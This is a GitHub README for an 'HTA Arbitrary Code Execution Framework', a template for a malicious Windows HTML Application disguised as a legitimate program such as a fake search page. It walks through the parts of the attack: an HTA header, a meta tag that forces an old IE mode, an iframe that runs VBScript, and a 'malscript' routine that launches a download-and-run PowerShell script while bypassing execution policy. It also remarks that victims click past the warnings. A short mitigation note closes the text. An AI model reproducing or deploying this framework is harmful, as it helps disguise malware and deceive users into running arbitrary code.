# HTA Arbitrary Code Execution Framework
Framework for a Hypertext Application designed to execute arbitrary code.<BR />
Created By: Brad Voris<BR />
<img alt="GitHub followers" src="https://img.shields.io/github/followers/bvoris?style=social">
<img alt="GitHub User's stars" src="https://img.shields.io/github/stars/bvoris?style=social"><BR />
<img alt="GitHub" src="https://img.shields.io/github/license/bvoris/HTAArbitraryCodeFramework">
<img alt="GitHub commit activity" src="https://img.shields.io/github/commit-activity/m/bvoris/HTAArbitraryCodeFramework">
<img alt="GitHub All Releases" src="https://img.shields.io/github/downloads/bvoris/HTAArbitraryCodeFramework/total">
<img alt="GitHub repo size" src="https://img.shields.io/github/repo-size/bvoris/HTAArbitraryCodeFramework">
<img alt="GitHub language count" src="https://img.shields.io/github/languages/count/bvoris/HTAArbitraryCodeFramework">
<img alt="GitHub issues" src="https://img.shields.io/github/issues/bvoris/HTAArbitraryCodeFramework">
<img alt="GitHub top language" src="https://img.shields.io/github/languages/top/bvoris/HTAArbitraryCodeFramework">

## What is HTA?
An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. The HTML is used to generate the user interface, and the scripting language is used for the program logic. An HTA executes without the constraints of the internet browser security model; in fact, it executes as a "fully trusted" application.<BR />

The usual file extension of an HTA is .hta.<BR />
Source: https://en.wikipedia.org/wiki/HTML_Application<BR />

## What is this "framework"?
Currently HTAs are still supported on Windows 11 and lower environments.<BR />
This means a crafty Hypertext Applicaiton can be used to steal information, hijack, or disgusing itself as a legitimate application. This makes it difficult to detect.<BR />
The framework itself is a set of files.<BR />
The HTA itself which is labeled as hack.hta<BR />
The fake "search" feature.<BR />
The malicious script or executable code.<BR />
PIE.js which we use for backwards compatability for CSS (we will get more on that on the secret sauce)<BR />

## What does it look like?
<IMG SRC="https://github.com/bvoris/HTAArbitraryCodeFramework/blob/main/screenshots/Google.com.png?raw=true" height="90%" width="90%">
 
## What's the secret sauce?
There are several components which equate out to the secret sauce<BR /><BR />
FIRST:<BR />
.HTA extension<BR />
This tells Windows that the file is a Hypertext Application.<BR /><BR />

SECOND:<BR />
<HTA:APPLICATION <BR />
     APPLICATIONNAME="HackToolz"<BR />
     SCROLL="yes"<BR />
     SINGLEINSTANCE="yes"<BR />
     SysMenu="yes"<BR />
><BR />
 This is the application information that is in the header of the HTML to preload and execute.<BR /><BR />

THIRD:  
'meta http-equiv="X-UA-Compatible" content="IE=8;IE=7;" /' <BR />
 This meta tag forces Internet Explorer to load the content in IE-7/IE-8.<BR /> This also reduces that security capability and allows arbitrary VBScript to run in the browser via my fith ingredient in the secret sauce. Since this is in the "master page / top level page" of the HTA all code on the "website" is forced to be in IE-8/IE-7 compatibility...<BR /><BR />

FOURTH:<BR />
script type="text/javascript" src=PIE.js<BR />
 This JavaScript allows for most CSS to work in IE-7. I didn't write this and it can be found here http://css3pie.com/<BR />
 <BR /><BR />
 
 FIFTH:<BR />
<IFRAME SRC="search.htm" frameBorder="0" NAME="iframie" WIDTH=800 HEIGHT=200 APPLICATION="yes"></IFRAME><BR />
 Awe yeah that aweful iframe but with a purpose. You can't actively run VBscript without a bunch of security warnings and code failures unless its a much older version of IE. What you can do is run VBScript in a targeted IFrame and ultimately bypass a lot of security becaus the Hypertext Application is "trusted" by the OS.<BR />
 You will get a security warning when you open the HTA, so its not totally fool proof but most people just click past them.<BR />
 <BR /><BR />

 SIXTH:<BR />
 <SCRIPT language="VBScript" type="text/vbscript"><BR />
	set objShell = CreateObject("WScript.Shell")<BR />
	strOut=""<BR />
	sub malscript<BR />
	cmdarg="%comspec% /c powershell.exe -ExecutionPolicy bypass -file c:\temp\downloadfileandruncmd.ps1 "<BR />
	set objExCmd = objShell.Exec(cmdarg)<BR />
	strOut=objExCmd.StdOut.ReadAll<BR />
	Set regEx = New RegExp<BR />
	regEx.Pattern = "[\f\n\r\v]+"<BR />
	regEx.Global = True<BR />
	regEx.Multiline = True<BR />
	strOut = regEx.Replace(strOut, "<br>")<BR />
	TraceOut.innerHTML= strOut<BR />
	end sub<BR />
	//--><BR />
</SCRIPT><BR />
 The VBScript that can run ANY command or script. I do mean ANY command. I've you've got python or powershell scripts you can just replace the executable and what ever script parameters needed. In this case it will execute a malicious PowerShell scriipt and bypass the execution policy.<BR />
 <BR /><BR />

SEVENTH:<BR />
BYOMS - Bring your own Malicious Script....<BR /><BR />
## Yes that's not so hard and its easy to construct fake application front ends even pass them off to websites for Man In the Middle Attacks, code injection, additional hijacking etc.
 This isn't rocket science here. Its literally taking legacy functionality that should have been removed a decade and exploiting it.<BR />

## What gave you the idea for this project?
One of my previous projects LANMonkey and a Printer deployment Hypertext application that I used back in the early 2000's. Both of the applications used Hypertext applications as a front end medium for enduser's and technicians to troubleshoot and deploy. I took a look at the code a few days ago and decided to mock up this to see if it could still work. Low and behold.... <BR /><BR />

## Conclusion:
The best prevention method for an exploit like this is just removing Internet Explorer, MSHTA.exe and blocking HTAs. Hypertext applications have been around since 1999. Until Microsoft removes this functionality it will always be a vulnerability ripe for exploit.
	
## Connect with me at

<a href="https://twitter.com/HMInfoSecViking?ref_src=twsrc%5Etfw"><IMG SRC="https://github.com/bvoris/bvoris/blob/master/twitter.jpg" WIDTH=10% HEIGHT=10% ALIGN=LEFT></a>

<a href="https://www.linkedin.com/in/brad-voris" target="_blank"><IMG SRC="https://github.com/bvoris/bvoris/blob/master/linkedin.png" WIDTH=10% HEIGHT=4% ALIGN=RIGHT></a>

<BR /><BR />
<BR /><BR />

<A HREF="https://www.victimoftechnology.com">Victim Of Technology<A />
<BR /><BR />
<A HREF="https://www.cyberforgesecurity.com">Cyber Forge Security, Inc.<A />
<BR /><BR />
